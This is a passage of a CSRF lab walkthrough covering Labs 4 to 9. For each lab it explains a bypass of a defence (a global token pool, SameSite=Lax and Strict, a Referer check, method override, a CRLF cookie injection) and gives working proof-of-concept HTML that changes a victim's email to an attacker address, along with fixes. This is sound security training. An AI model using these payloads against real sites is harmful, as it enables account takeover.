2. Look at the **Token Inspector** panel → it shows:
   - `Attacker token (pool): csrf_token_abc123xyz`
3. This is a real valid token from the global pool

**Step 2 — Confirm the pool doesn't check session**
- The victim's session has token `pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB`
- The attacker's token is `csrf_token_abc123xyz`
- Both are in the same pool — server accepts either for any user

**Step 3 — Generate the PoC**

Click **"Generate PoC ▼"** or use:

```html
<html>
  <!-- CSRF PoC - generated by CSRF Master -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/email/change/4" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="csrf_token_abc123xyz" />
      <!-- attacker's own token — works for any session! -->
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Step 4 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server**
2. Click **Store** → **Deliver exploit to victim**
3. Server validates: `csrf_token_abc123xyz` is in the pool → **accepted**
4. **"🎉 Lab Solved!"** banner appears

---

### Behind the Scenes

```
Attacker session                   Global Token Pool
csrf_token_abc123xyz  ─────────────▶ [ abc123xyz ✅ ]
                                      [ def456uvw ✅ ]
                                      [ ghi789rst ✅ ]
Victim session                            │
pBMFhDgHNqmBWsFtbw   ─────────────▶ [ pBMFhDg...  ✅ ]

Server check: "Is the submitted token IN the pool?"
→ YES (attacker's token is valid pool member)
→ Allows the request for the victim's session ← BUG
```

---

### The Real Fix

Tokens must be **bound to the specific session that generated them**:

```javascript
// CORRECT: generate token per session
req.session.csrfToken = crypto.randomBytes(32).toString('hex');

// CORRECT: validate against session, not a global pool
if (req.body.csrf !== req.session.csrfToken) {
    reject();
}
```

---

### Key Takeaway

> A token that proves "someone logged-in generated this" is **not** the same as "the current session generated this." CSRF tokens must be **session-specific** — generated for one session and validated against that exact session.

---

### Quick Reference — Lab 4

| What | Value |
|---|---|
| Vulnerable endpoint | `POST http://localhost:3000/email/change/4` |
| Attacker's valid token | `csrf_token_abc123xyz` |
| Why it works | Server checks pool membership, not session binding |
| Exploit method | POST form with attacker's own valid token |
| Fix | Bind tokens to session at generation, validate binding on each request |

---

*Continue to [Lab 5 — SameSite Lax bypass via GET](http://localhost:3000/lab/samesite-lax)*

---

## Lab 5 — CSRF with SameSite Lax Bypass via GET Request

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/samesite-lax` |
| **Goal** | Bypass SameSite=Lax protection by triggering the action via GET |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

The session cookie is set with `SameSite=Lax` — which blocks cross-site POST requests. However, the email change endpoint also **accepts GET requests**, and SameSite=Lax allows cookies on cross-site **top-level GET navigations**.

> **Simple analogy:** The bank locks the back door (POST is blocked). But the front door is still open if you just walk up to it normally (GET navigation). The guard waves you through because it looks like you just "clicked a link."

---

### Understanding SameSite=Lax

The cookie is set as:
```http
Set-Cookie: session=victim_session_abc123; SameSite=Lax; Path=/
```

| Request type | Cookie sent? | CSRF possible? |
|---|---|---|
| Cross-site POST (form submit) | ❌ Blocked by Lax | ✅ Protected |
| Cross-site GET (document.location) | ✅ Sent | ❌ Vulnerable! |
| Cross-site GET (background fetch) | ❌ Blocked | ✅ Protected |
| Same-site anything | ✅ Always sent | Depends on other defenses |

SameSite=Lax specifically allows cookies on **top-level navigation GET requests** — this is how normal links work (clicking a link is a GET navigation).

---

### The Intercepted HTTP Request

GET-based request (bypass):
```http
GET /email/change/5?email=attacker@evil.com HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123; SameSite=Lax
```

---

### Step-by-Step Solution

**Step 1 — Confirm SameSite=Lax is set**
1. Open `http://localhost:3000/lab/samesite-lax`
2. The **Token Inspector** shows: `Cookie SameSite: Lax`
3. Also notice: response header sets `SameSite=Lax` on the session cookie

**Step 2 — Confirm cross-site POST is blocked**
- A hidden form using `method="POST"` would NOT include the Lax cookie → attack fails

**Step 3 — Find the GET endpoint**
- The lab accepts GET: `GET /email/change/5?email=new@email.com`
- This is the mistake — state-changing actions should never use GET

**Step 4 — Generate the PoC**

Click **"Generate PoC ▼"** or use:

```html
<html>
  <!-- CSRF PoC - generated by CSRF Master -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      document.location = 'http://localhost:3000/email/change/5?email=attacker@evil.com';
    </script>
  </body>
</html>
```

`document.location = ...` triggers a **top-level GET navigation** → SameSite=Lax cookie IS sent.

**Step 5 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server**
2. Click **Store** → **Deliver exploit to victim**
3. Victim's browser navigates to the URL, cookie is attached, email changes
4. **"🎉 Lab Solved!"** banner appears

---

### Behind the Scenes

```
evil.com exploit page              localhost:3000
        │                                │
        │  document.location = URL       │
        │                                │
        │─── GET /email/change/5 ───────▶│
        │    ?email=attacker@evil.com    │
        │    Cookie: session=abc123      │ ← Lax allows this!
        │    (top-level navigation)      │
        │                                │ Changes email
        │◀─── 302 redirect ─────────────│
```

**Why the cookie is sent:**
`document.location` = user navigating to a new page = top-level navigation.
SameSite=Lax says: *"I'll send the cookie if it looks like the user clicked a link."*
`document.location` looks exactly like that.

---

### The Two Fixes Needed

```
Fix 1: Only use POST for state-changing actions (never GET)
       GET /email/change should return 405 Method Not Allowed

Fix 2: Use SameSite=Strict instead of Lax
       SameSite=Strict blocks ALL cross-site requests, including GET navigations
```

Using both together gives full protection.

---

### Key Takeaway

> SameSite=Lax is **not full CSRF protection** — it only blocks cross-site POST. If your state-changing endpoint accepts GET, the protection is bypassed. **Always combine SameSite=Lax with CSRF tokens**, and never allow GET requests to modify data.

---

### Quick Reference — Lab 5

| What | Value |
|---|---|
| Cookie attribute | `SameSite=Lax` |
| What Lax blocks | Cross-site POST form submissions |
| What Lax allows | Cross-site GET top-level navigations |
| Vulnerable endpoint | `GET http://localhost:3000/email/change/5?email=...` |
| Exploit method | `document.location` redirect |
| Fix | Use POST only + SameSite=Strict (or add CSRF token) |

---

*Continue to [Lab 6 — Referer validation bypass](http://localhost:3000/lab/referer-bypass)*

---

## Lab 6 — CSRF with Referer Validation Bypass

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/referer-bypass` |
| **Goal** | Bypass Referer header validation by suppressing the header entirely |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

This application validates the `Referer` header to check that requests come from its own domain. However, it **only performs this check when the Referer header is present**. If the header is absent, the check is skipped and the request is accepted.

> **Simple analogy:** A bouncer asks "Where did you come from?" and rejects you if you say the wrong place. But if you just shrug and say nothing — they let you straight in.

---

### What the Referer Header Is

The `Referer` header is sent by the browser and tells the server where the request came from:

```http
POST /email/change/6 HTTP/1.1
Referer: https://evil.com/attack    ← browser's "where did you come from?"
Cookie: session=victim_session_abc123
```

A server can use this to block cross-site requests. But this defense has weaknesses:
- Browsers don't always send the Referer (privacy modes, HTTPS→HTTP, meta tags)
- The validation logic is often flawed

---

### The Vulnerability — Flawed Validation Logic

The server code:

```javascript
// VULNERABLE — skips check when header absent
if (referer && !referer.includes('localhost:3000')) {
    reject();   ← only runs when Referer EXISTS and is wrong
}
// If referer is null/undefined — falls through to:
process_email_change();   ← allowed!
```

The three cases:

| Referer header | Result |
|---|---|
| `Referer: http://localhost:3000/my-account` | ✅ Allowed (own domain) |
| `Referer: https://evil.com/attack` | ❌ Blocked (wrong domain) |
| *(no Referer header)* | ✅ **Allowed** ← the bug |

---

### The Intercepted HTTP Requests

Normal request (Referer present from own site):
```http
POST /email/change/6 HTTP/1.1
Host: localhost:3000
Referer: http://localhost:3000/my-account
Cookie: session=victim_session_abc123

email=wiener@normal-user.net
```

Attack attempt — Referer is from evil.com → BLOCKED:
```http
POST /email/change/6 HTTP/1.1
Host: localhost:3000
Referer: https://evil.com/attack
Cookie: session=victim_session_abc123

email=attacker@evil.com
```

Bypass — Referer suppressed entirely → ALLOWED:
```http
POST /email/change/6 HTTP/1.1
Host: localhost:3000
(no Referer header)
Cookie: session=victim_session_abc123

email=attacker@evil.com
```

---

### How to Suppress the Referer Header

Use a `<meta>` tag in the exploit page's `<head>`:

```html
<meta name="referrer" content="never">
```

This tells the browser: **"Do not send the Referer header for any requests from this page."**

When the victim visits this page and the form auto-submits, the POST to `/email/change/6` will have **no Referer header** → server skips the check → email changed.

---

### Step-by-Step Solution

**Step 1 — Confirm Referer check is active**
1. Open `http://localhost:3000/lab/referer-bypass`
2. Token Inspector shows: `Referer check: enabled (skipped when absent)`
3. Try submitting the form from the My Account page → Referer is from our own domain → accepted normally

**Step 2 — Confirm the check blocks evil.com**
- A plain POST from an external page would be blocked (Referer = evil.com → 403)

**Step 3 — Suppress the Referer header**
- Add `<meta name="referrer" content="never">` to the exploit page

**Step 4 — Generate the PoC**

Click **"Generate PoC ▼"** or use:

```html
<html>
  <!-- CSRF PoC - generated by CSRF Master -->
  <head>
    <meta name="referrer" content="never">
  </head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/email/change/6" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

The `<meta name="referrer" content="never">` is the key line — it drops the Referer from all requests made by this page.

**Step 5 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server**
2. Click **Store** → **Deliver exploit to victim**
3. Server receives POST with **no Referer** → skips validation → email changed
4. **"🎉 Lab Solved!"** banner appears

---

### Behind the Scenes

```
evil.com exploit page (has meta referrer=never)
        │
        │  form auto-submits
        │
        │──── POST /email/change/6 ────▶ localhost:3000
        │     NO Referer header!         │
        │     Cookie: session=abc123     │  Server checks:
        │                                │  if (referer) { validate }
        │                                │  referer = null → skip check!
        │◀─── 302 redirect ─────────────│  email changed ✅
```

---

### Other Referer Bypass Techniques

Even without the meta tag, Referer validation can be fooled:

**Subdomain trick** (if server checks "starts with"):
```
https://localhost:3000.evil.com/attack
← Referer starts with "localhost:3000" → check passes!
```

**Query string trick** (if server checks "contains"):
```
https://evil.com/attack?localhost:3000
← Referer contains "localhost:3000" → check passes!
```

---

### The Real Fix

Referer-based validation should be a **secondary defense only**, never the primary one.

```
✅ Primary defense:   CSRF token (session-bound, validated server-side)
⚠️ Secondary only:   Referer header check (fragile, suppressible)

Correct Referer logic:
    if (!referer || !referer.startsWith('https://mysite.com')) {
        reject();   ← reject when ABSENT too, not just when wrong
    }
```

---

### Key Takeaway

> The Referer header can always be suppressed by the browser — through meta tags, privacy mode, HTTPS→HTTP transitions, and browser settings. **Never rely on Referer alone for CSRF protection.** Use it only as a secondary layer alongside CSRF tokens.

---

### Quick Reference — Lab 6

| What | Value |
|---|---|
| Vulnerable endpoint | `POST http://localhost:3000/email/change/6` |
| Defense in place | Referer header validation |
| Bypass technique | `<meta name="referrer" content="never">` |
| What server receives | POST with no Referer header |
| Server behaviour | Skips check when Referer absent → allows request |
| Fix | Reject requests with absent Referer + add CSRF token |

---

*Continue to [Lab 7 — SameSite Lax bypass via method override](http://localhost:3000/lab/method-override)*

---

## Lab 7 — SameSite Lax Bypass via Method Override

> **PortSwigger equivalent:** Lab: SameSite Lax bypass via method override

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/method-override` |
| **Goal** | Bypass SameSite=Lax default protection by using `_method=POST` query parameter |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

The session cookie does **not** explicitly declare a `SameSite` attribute. Since Chrome 91 (2021), cookies without an explicit SameSite value default to `SameSite=Lax`. This means:
- Cross-site POST requests → cookie is **NOT** sent → traditional CSRF forms fail
- Cross-site GET top-level navigation → cookie **IS** sent

However, the application's server-side framework supports **HTTP method overriding** via the `_method` query parameter. When the server receives:

```
GET /email/change/7?email=attacker@evil.com&_method=POST
```

It treats this as a **POST** request internally, even though the browser sent a GET.

> **Simple analogy:** The bank only allows POST deliveries through the back door (which is locked for outsiders). But there's a trick: if you write "I'm a POST" on the delivery slip and send it through the front door (GET), the mailroom processes it as a POST anyway. The lock on the back door (SameSite=Lax) is useless.

---

### Understanding the Method Override Trick

Some web frameworks (Symfony, Laravel, Rails, etc.) support a `_method` parameter that overrides the HTTP method. This exists because HTML forms only support GET and POST — frameworks use this to simulate PUT, PATCH, and DELETE.

```
Browser sends:   GET /endpoint?_method=POST
Framework sees:  POST /endpoint
```

This design decision was intended for legitimate use — but combined with SameSite=Lax defaults, it creates a CSRF bypass:

```
SameSite=Lax says:
  ❌ Don't send cookie on cross-site POST
  ✅ Do send cookie on cross-site GET navigation

Method override says:
  GET with _method=POST → treated as POST

Combined:
  Attacker sends GET (cookie IS attached due to Lax)
  Server treats it as POST (processes the state change)
  Result: CSRF bypass! 🎯
```

---

### The Intercepted HTTP Request

Normal POST request (blocked by SameSite=Lax on cross-site):
```http
POST /email/change/7 HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

Bypass via GET with method override:
```http
GET /email/change/7?email=attacker@evil.com&_method=POST HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123     ← Lax allows this on GET navigation!
```

The server sees `_method=POST` → routes the request as if it were a POST → processes the email change.

---

### CSRF Vulnerability Analysis — 3 Conditions

| Condition | Status | Why |
|---|---|---|
| Relevant action | ✅ | Email change → password reset → full account takeover |
| Cookie-based session | ✅ | Session cookie identifies the user, attached automatically on GET navigation |
| No unpredictable params | ✅ | No CSRF token required — just `email` and `_method` (both attacker-controlled) |

---

### Step-by-Step Solution

**Step 1 — Confirm SameSite=Lax is the default**

1. Open `http://localhost:3000/lab/method-override`
2. Check the session cookie in DevTools → Application → Cookies
3. The cookie has **no explicit SameSite attribute** → Chrome defaults to Lax
4. The Token Inspector confirms: `SameSite: Lax (default)`

**Step 2 — Confirm cross-site POST is blocked**

If you try a normal CSRF POST form from the exploit server:
```html
<form action="http://localhost:3000/email/change/7" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

This **fails** because SameSite=Lax blocks the cookie on cross-site POST. The server receives no session cookie → rejects the request.

**Step 3 — Discover method override support**

Try adding `_method=POST` to a GET request:
```
GET /email/change/7?email=test@test.com&_method=POST
```

The server processes it as a POST and changes the email! This confirms method overriding is supported.

**Step 4 — Build the exploit**

Since `document.location` triggers a **top-level GET navigation** (which SameSite=Lax allows), we can combine it with the `_method=POST` override:

```html
<html>
  <!-- CSRF PoC - Lab 7: SameSite Lax bypass via method override -->
  <body>
    <script>history.pushState('', '', '/')</script>
    <script>
      document.location = 'http://localhost:3000/email/change/7?email=attacker@evil.com&_method=POST';
    </script>
  </body>
</html>
```

**What each part does:**

| Part | Purpose |
|---|---|
| `document.location = ...` | Triggers top-level GET navigation → SameSite=Lax cookie IS sent |
| `email=attacker@evil.com` | The new email (attacker-controlled) |
| `_method=POST` | Tells the server framework to treat this GET as a POST |
| `history.pushState` | Hides the URL from the address bar (cosmetic) |

**Step 5 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server**
2. Click **Store** → **Deliver exploit to victim**
3. Victim's browser navigates via GET → cookie sent → server overrides to POST → email changed
4. **"🎉 Lab Solved!"** banner appears

---

### Behind the Scenes — Full Attack Flow

```
evil.com exploit page                     localhost:3000
        │                                       │
        │  document.location = URL              │
        │                                       │
        │──── GET /email/change/7 ─────────────▶│
        │     ?email=attacker@evil.com          │
        │     &_method=POST                     │
        │     Cookie: session=victim123         │ ← Lax allows GET nav!
        │     (top-level navigation)            │
        │                                       │ Server sees _method=POST
        │                                       │ Routes as POST internally
        │                                       │ Changes email ✅
        │◀─── 302 redirect ───────────────────│
```

**Why does the cookie get sent?**
- `document.location` = top-level navigation = the user appears to be "clicking a link"
- SameSite=Lax explicitly allows cookies on top-level GET navigations
- The browser doesn't know about `_method=POST` — it just sees a normal GET

**Why does the server process it?**
- The framework middleware reads `_method=POST` from the query string
- It overrides `req.method` from GET to POST
- The POST route handler runs and processes the email change

---

### Why This Is Different from Lab 5

| | Lab 5 (SameSite Lax + GET) | Lab 7 (Method Override) |
|---|---|---|
| Endpoint accepts GET? | ✅ Yes — server processes GET for email change | ❌ No — server requires POST for email change |
| How GET bypass works | Endpoint genuinely handles GET requests | `_method=POST` tricks framework into treating GET as POST |
| SameSite setting | Explicit `SameSite=Lax` | Browser-default Lax (no explicit attribute) |
| Root cause | Endpoint design flaw (GET for state change) | Framework feature (method overriding) |

Lab 5: The server directly accepts GET requests for the action.
Lab 7: The server only accepts POST — but the `_method` override makes GET act as POST.

---

### The Real Fix

```javascript
// FIX 1: Disable method overriding in the framework
// In Express.js with method-override middleware:
// Simply do NOT use app.use(methodOverride('_method'))

// FIX 2: Only accept method overrides via POST body, not query string
// This way only same-site POST requests (which already have the cookie)
// can override the method — GET query strings can't

// FIX 3: Use explicit SameSite=Strict
res.setHeader('Set-Cookie', 'session=abc123; SameSite=Strict; HttpOnly; Path=/');
// Strict blocks ALL cross-site requests including GET navigation

// FIX 4: Add CSRF tokens (best defense regardless of SameSite)
```

**The fundamental issue:** Method overriding from query strings allows GET requests to trigger POST actions. Combined with SameSite=Lax (which permits GET navigation), this completely bypasses the browser's default CSRF protection.

---

### Key Takeaway

> SameSite=Lax is **not foolproof** — it blocks cross-site POST but allows cross-site GET navigation. If the server supports **method overriding** via query parameters (like `_method=POST`), an attacker can trigger POST-only actions through GET requests — and SameSite=Lax will happily send the cookie along. **Disable method overriding from query strings** or use **SameSite=Strict** to prevent this.

---

### Quick Reference — Lab 7

| What | Value |
|---|---|
| Cookie attribute | No explicit SameSite → Chrome defaults to Lax |
| What Lax blocks | Cross-site POST form submissions |
| What Lax allows | Cross-site GET top-level navigations |
| Vulnerable endpoint | `GET http://localhost:3000/email/change/7?email=...&_method=POST` |
| Server behavior | `_method=POST` overrides method → routes as POST |
| Exploit method | `document.location` redirect with `_method=POST` query param |
| Fix | Disable method overriding from query strings + add CSRF token |

---

*Continue to [Lab 8 — SameSite Strict Bypass via Client-Side Redirect](#lab-8--samesite-strict-bypass-via-client-side-redirect)*

---

## All Labs — Summary Table

| Lab | Difficulty | Defence | Bypass | Key Trick |
|---|---|---|---|---|
| 1 | APPRENTICE | None | N/A | Basic auto-submit POST form |
| 2 | PRACTITIONER | Token on POST | Switch to GET | `document.location` navigation |
| 3 | PRACTITIONER | Token when present | Remove token param | Omit `csrf=` field entirely |
| 4 | PRACTITIONER | Token (global pool) | Use own token | Attacker's token valid for any session |
| 5 | PRACTITIONER | SameSite=Lax | GET endpoint exists | `document.location` = top-level GET nav |
| 6 | PRACTITIONER | Referer check | Suppress Referer | `<meta name="referrer" content="never">` |
| 7 | PRACTITIONER | SameSite=Lax (default) | Method override | GET + `_method=POST` query param |
| 8 | PRACTITIONER | SameSite=Strict | Client-side redirect | On-site redirect gadget + path traversal GET |
| 9 | PRACTITIONER | Token tied to non-session cookie | Inject csrfKey via CRLF + use own token | HTTP header injection → cookie planting |
| 10 | PRACTITIONER | Token duplicated in cookie | Inject csrf cookie via CRLF | Double-submit → both sides attacker-controlled |

---

## Lab 8 — SameSite Strict Bypass via Client-Side Redirect

> **PortSwigger equivalent:** Lab: SameSite Strict bypass via client-side redirect

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `https://YOUR-LAB-ID.web-security-academy.net` |
| **Goal** | Change the victim's email address by bypassing SameSite=Strict using a client-side redirect gadget |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

The website sets the session cookie with `SameSite=Strict`. This prevents the browser from including the cookie in any cross-site request (even clicking a link from an external page).

However, if we can find a **client-side redirect gadget** on the target site itself, we can bypass this restriction. A client-side redirect gadget is JavaScript code that dynamically navigates to a new URL based on user input (e.g., query parameters).

By sending the victim to the target site's redirect gadget, we trigger a request. Because the redirect is executed by JavaScript *on the target site*, the browser treats the subsequent redirect request as **same-site**. Therefore, the browser includes the `SameSite=Strict` cookie!

> **Why Server-Side Redirects (302) Don't Work:** When a server issues a 302 redirect, the browser tracks the redirect back to the original cross-site origin and blocks the `SameSite=Strict` cookie. Only **client-side JS redirects** create a fresh, clean same-site request where strict cookies are attached.

---

### The Client-Side Redirect Gadget

When posting a comment, the application shows a confirmation page at:
`/post/comment/confirmation?postId=x`

This confirmation page loads a JavaScript file `/resources/js/commentConfirmationRedirect.js` which reads the `postId` parameter and performs a client-side redirect back to the post:
```javascript
// Inside commentConfirmationRedirect.js
const postId = new URLSearchParams(window.location.search).get('postId');
// Constructs the redirect path dynamically:
window.location = '/post/' + postId;
```

If we input `postId=../my-account`, the browser normalizes it:
`/post/../my-account` becomes `/my-account` (path traversal).

Thus, visiting:
`/post/comment/confirmation?postId=../my-account`
will trigger client-side JavaScript to do:
`window.location = '/my-account'`
which is a same-site request, sending the session cookie.

---

### Bypassing SameSite Strict to Change Email

The email change function is at `/my-account/change-email`. By testing in Burp Repeater (using "Change request method"), we can confirm that this endpoint accepts **GET** requests:
`GET /my-account/change-email?email=attacker@evil.com&submit=1`

If we use path traversal in the client-side redirect gadget, we can make it redirect to the email change endpoint:
`/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1`

> [!IMPORTANT]
> The ampersand `&` separating query parameters must be URL-encoded as `%26` so it is treated as part of the `postId` value in the initial request, rather than a separate parameter for the confirmation page.

---

### The Intercepted HTTP Request

What the server receives:
```http
GET /my-account/change-email?email=attacker@evil.com&submit=1 HTTP/1.1
Host: target-website.net
Cookie: session=victim_strict_session_abc123
```
Even though the victim originally clicked a link on the exploit server, the redirect to the change-email endpoint was triggered by JavaScript running on the target site itself. The browser treats it as a same-site request and attaches the session cookie, successfully changing the email.

---

### CSRF Vulnerability Analysis — 3 Conditions

| Condition | Status | Why |
|---|---|---|
| Relevant action | ✅ | Email change allows taking over the account. |
| Cookie-based session | ✅ | Session is tracked by a cookie (which has SameSite=Strict). |
| No unpredictable params | ✅ | No CSRF tokens are checked on the email change endpoint. |

---

### Step-by-Step Solution

**Step 1 — Study the change email function**
1. Log in to your account (`wiener:peter`) and change your email.
2. In Burp history, check the `POST /my-account/change-email` request. It has no anti-CSRF tokens.
3. Check the login response. The cookie is set with `SameSite=Strict`.

**Step 2 — Identify the client-side redirect gadget**
1. Go to a blog post and leave a comment.
2. Observe that you are taken to `/post/comment/confirmation?postId=x` and then redirected back.
3. Check the JS source code `/resources/js/commentConfirmationRedirect.js` to see how it uses `postId` to construct the redirect URL client-side.

**Step 3 — Test path traversal on the gadget**
1. Visit: `/post/comment/confirmation?postId=1/../../my-account`
2. Confirm you are redirected to the account page and remain logged in (strict cookie was sent).

**Step 4 — Test email change via GET**
1. Send the email change POST request to Burp Repeater.
2. Right-click the request and select **Change request method** to convert it to a GET.
3. Send it and verify it successfully changes your email.

**Step 5 — Build and deliver the exploit**
1. Go to the exploit server and write the following HTML script (changing the domain to the target lab ID):
```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
2. Store the exploit and click **View exploit** to test it on yourself.
3. Change the email address to a different throwaway one (`test5@test.ca`).
4. Click **Deliver exploit to victim** to solve the lab.

---

### Key Takeaway

> SameSite=Strict cookies block all cross-site requests, but they **do not protect against client-side redirects (gadgets) on the same site**. If an attacker can find a JavaScript-driven redirect on your domain that accepts arbitrary paths, they can route cross-site visitors through this gadget. The browser will treat the redirection as same-site and attach all Strict cookies. Always validate redirect destinations on the client side.

---

*Continue to [Lab 9 — CSRF Where Token Is Tied to Non-Session Cookie](#lab-9--csrf-where-token-is-tied-to-non-session-cookie)*

---

## Lab 9 — CSRF Where Token Is Tied to Non-Session Cookie

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/csrf-cookie` |
| **Goal** | Inject your csrfKey cookie into the victim's browser, then forge the email change |
| **Credentials** | wiener : peter  AND  carlos : montoya (two accounts needed) |

---

### What This Lab Is About

This application uses **two separate cookies**:
- `session` — identifies who the user is
- `csrfKey` — used to validate the CSRF token

The CSRF token is tied to the `csrfKey` cookie — not the session. This means if an attacker can **plant their own csrfKey cookie** in the victim's browser, they can use their own matching CSRF token in a forged request.

The application also has a **search function** vulnerable to HTTP header injection (CRLF injection) — which lets the attacker inject a `Set-Cookie` header into the victim's browser.

> **Simple analogy:** A bank validates your cheque by checking your signature against a stamp — but the stamp is on a separate card that anyone can swap out. If the attacker replaces your stamp with theirs, they can sign cheques using their own signature.

---

### The Two Cookies Explained

```
session=victim_session_abc123      ← identifies WHO you are (session)
csrfKey=victim_csrfkey_def456      ← used to validate CSRF token (separate!)

CSRF token in form: csrf=victim_csrf_token_uvw012
                         (matches the csrfKey, NOT the session)
```

When the server receives a request it checks:
```
Does csrf_token match the csrfKey cookie?   ← checks these two together
NOT: Does csrf_token match the session?     ← this is NOT checked!
```

This means if the attacker can **replace the victim's csrfKey cookie** with their own, they can use their own matching csrf token.

---

### The Vulnerability — HTTP Header Injection (CRLF Injection)

The search function reflects your query directly into a response header:

```
Request:  GET /?search=hat
Response: Set-Cookie: lastSearch=hat
```

If the search query contains CRLF characters (`%0d%0a` = `\r\n`), an attacker can inject additional headers:

```
Request:  GET /?search=hat%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None
Response: Set-Cookie: lastSearch=hat
          Set-Cookie: csrfKey=ATTACKER_KEY; SameSite=None     ← injected!
```

The victim's browser receives this response and stores the injected cookie.

---

### The Full Attack — Two Phases

**Phase 1: Inject the csrfKey cookie**

Using an `<img>` tag to cause the victim's browser to make a GET request to the search endpoint — which injects the attacker's csrfKey as a cookie:

```html
<img src="http://localhost:3000/lab/csrf-cookie/search
          ?q=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

- The `<img>` src triggers a GET to the search endpoint
- The CRLF injection sets `csrfKey=ATTACKER_KEY` in the victim's browser
- The `onerror` fires the form after the cookie is planted

**Phase 2: Submit the forged form**

The form uses the attacker's own CSRF token (which matches the injected csrfKey):

```html
<form action="http://localhost:3000/email/change/7" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="ATTACKER_CSRF_TOKEN">
</form>
```

---

### The Intercepted HTTP Request

What the server receives:
```http
POST /email/change/7 HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123;
        csrfKey=ATTACKER_KEY          ← victim's browser has attacker's csrfKey now!
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf=ATTACKER_CSRF_TOKEN
```

Server validation:
```
Does ATTACKER_CSRF_TOKEN match csrfKey=ATTACKER_KEY?   → YES (attacker chose both!)
Is csrfKey tied to the session?                        → NO  (that's the flaw)
Result: ALLOWED ✅
```

---

### Step-by-Step Solution

**Step 1 — Log in as wiener and capture the request**
1. Open `http://localhost:3000/lab/csrf-cookie`
2. Note the Token Inspector shows:
   - Your csrfKey: `attacker_csrfKey_xyz789`
   - Your csrf token: `attacker_csrf_UYjqwyyGyrsnr8qG`

**Step 2 — Confirm csrfKey is not tied to session**
- Log in as carlos (second account) with different session
- Try submitting wiener's csrf token + wiener's csrfKey with carlos's session
- Server accepts it — because csrfKey is independent of session!

**Step 3 — Find the CRLF injection point**
- Test the search endpoint: `GET /lab/csrf-cookie/search?q=test`
- Response includes: `Set-Cookie: lastSearch=test`
- Now inject: `?q=test%0d%0aSet-Cookie:%20csrfKey=myvalue%3b%20SameSite=None`
- Response now also sets: `Set-Cookie: csrfKey=myvalue; SameSite=None`

**Step 4 — Generate the full PoC**

Click **"Generate PoC ▼"** on the lab page, or use:

```html
<html>
  <!-- CSRF PoC - Lab 9: Token tied to non-session cookie -->
  <body>
    <h1>Hello World!</h1>
    <form action="http://localhost:3000/email/change/8"
          method="POST" id="csrf-form">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf"  value="attacker_csrf_UYjqwyyGyrsnr8qG">
    </form>

    <img src="http://localhost:3000/lab/csrf-cookie/search
?q=test%0d%0aSet-Cookie:%20csrfKey=attacker_csrfKey_xyz789%3b%20SameSite=None"
         onerror="document.forms[0].submit()">
  </body>
</html>
```

**What each part does:**
| Part | Purpose |
|---|---|
| `<form>` | The forged email change request |
| `csrf=attacker_csrf_...` | Attacker's own valid token |
| `<img src="...search?q=...">` | Triggers GET to CRLF-injectable search endpoint |
| `%0d%0a` | CRLF — injects new header line |
| `Set-Cookie: csrfKey=...` | Plants attacker's csrfKey in victim's browser |
| `onerror="...submit()"` | Fires form AFTER cookie is planted (img fails to load = onerror fires) |

**Step 5 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server**
2. Click **Store** → **Deliver exploit to victim**
3. Victim's browser:
   - Loads the exploit page
   - Makes GET to search → plants attacker's csrfKey cookie
   - `onerror` fires → POSTs the form
   - Server validates csrf against csrfKey → match! → email changed
4. **"🎉 Lab Solved!"** banner appears

---

### Behind the Scenes — Full Flow

```
Victim browser                 localhost:3000
     │                               │
     │  load exploit page            │
     │                               │
     │─── GET /search?q=test         │
     │    %0d%0aSet-Cookie:          │
     │    csrfKey=ATTACKER_KEY ─────▶│
     │                               │ Response includes:
     │◀── Set-Cookie: csrfKey= ──────│ Set-Cookie: csrfKey=ATTACKER_KEY
     │    ATTACKER_KEY               │ (cookie now in victim's browser!)
     │                               │
     │  <img> fails → onerror fires  │
     │                               │
     │─── POST /email/change/7 ─────▶│
     │    Cookie: session=victim     │
     │    Cookie: csrfKey=ATTACKER   │ ← attacker's key (injected!)
     │    csrf=ATTACKER_TOKEN        │ ← attacker's token (matches!)
     │                               │
